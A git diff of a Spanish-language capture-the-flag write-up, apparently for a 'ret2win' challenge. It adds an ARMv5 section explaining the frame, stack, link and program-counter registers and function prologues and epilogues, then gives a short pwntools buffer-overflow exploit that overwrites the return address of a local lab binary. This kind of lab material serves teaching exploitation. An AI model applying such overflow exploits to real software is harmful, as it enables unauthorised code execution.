@@ -5,6 +5,7 @@
 ## Indice
 - [x86](x86)
 - [x86-64](#x86_64)
+- [ARMv5](#ARMv5)
 - [Notas](#Notas)
 
 # x86
@@ -380,9 +381,26 @@ io.sendline(offset+ret2win)
 
 io.success(io.recvall())
 ```
- 
+
+# ARMv5
+
+En ARM de 32 bits:
+- Los registros `fp`, `sp` y `pc` son analogos a `ebp`, `esp` y `eip` en x86, es decir, frame pointer, stack pointer y program counter.
+- El registro `lr` o link register contiene la direccion de retorno al hacer un `bl`.
+- La instruccion `bl address` o branch with link, hace `lr=pc+4` (o `lr=pc+2` en thumb mode) y `pc=address`.
+- El prologo de una funcion luce como `push {fp, lr}` (almacena `fp` en `[sp]` y `lr` en `[sp+4]`)
+- El epilogo de una funcion suele ser `pop {fp, pc}` (carga `fp` desde `[sp]` y `pc` desde `[sp+4]`) 
+
+## Exploit
+```py
+from pwn import *
+io = process("./ret2win_armv5")
+
+payload = b"A"*32 + b"B"*4 + p32(0x000105ec)
+io.sendline(payload)
+io.interactive()
+```
+
 # Notas
 
 En este reto calculamos el offset, pero en los siguientes retos sera el mismo para su correspondiente arquitectura.
-
-
